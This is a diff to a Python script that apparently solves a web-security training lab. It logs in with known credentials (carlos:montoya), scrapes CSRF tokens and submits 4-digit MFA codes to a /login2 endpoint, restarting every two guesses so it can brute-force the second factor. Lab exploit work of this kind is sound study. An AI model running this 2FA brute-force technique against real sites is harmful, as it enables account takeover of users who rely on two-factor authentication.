@@ -3,6 +3,24 @@ import sys
 import requests
 from bs4 import BeautifulSoup
 
+
+# Login to user we have credentials for.
+def login(uname, pw, csrf_token):
+    login_data = {
+        'csrf': csrf_token,
+        'username': uname,
+        'password': pw
+    }
+    print(f'Logging in as carlos:montoya')
+    response = s.post(login_url, data=login_data)
+    print(f'Login response: {response.text}')
+    return response.text
+
+
+# Start script
+# ------------------------
+
+# Pull site info from cli args -- drop https:// if included
 site = sys.argv[1]
 if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
@@ -15,18 +33,10 @@ resp = s.get(login_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
 csrf = soup.find('input', {'name': 'csrf'}).get('value')
 
-# Login to user we have credentials for.
-logindata = {
-    'csrf': csrf,
-    'username': 'carlos',
-    'password': 'montoya'
-}
-print(f'Logging in as carlos:montoya')
-resp = s.post(login_url, data=logindata)
-print(f'Login response: {resp.text}')
-
-# Get next csrf token for interaction with 2fa (login2) endpoint.
-soup = BeautifulSoup(resp.text, 'html.parser')
+# Then: Grab response after successful login to grab the csrf token for interaction with 2fa login page
+#       Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
+response_text = login('carlos', 'montoya', csrf)
+soup = BeautifulSoup(response_text, 'html.parser')
 csrf = soup.find('input', {'name': 'csrf'}).get('value')
 
 # Send auth request to 2fa endpoint with csrf token and '0000'
@@ -34,8 +44,8 @@ csrf = soup.find('input', {'name': 'csrf'}).get('value')
 # that makes this post with a different 4-digit code each time.
 login2_url = f'https://{site}/login2'
 login2data = {
-    'csrf' : csrf,
-    'mfa-code' : str(0).zfill(4)
+    'csrf': csrf,
+    'mfa-code': str(0).zfill(4)
 }
 resp = s.post(login2_url, data=login2data, allow_redirects=False)
 if resp.status_code == 302:
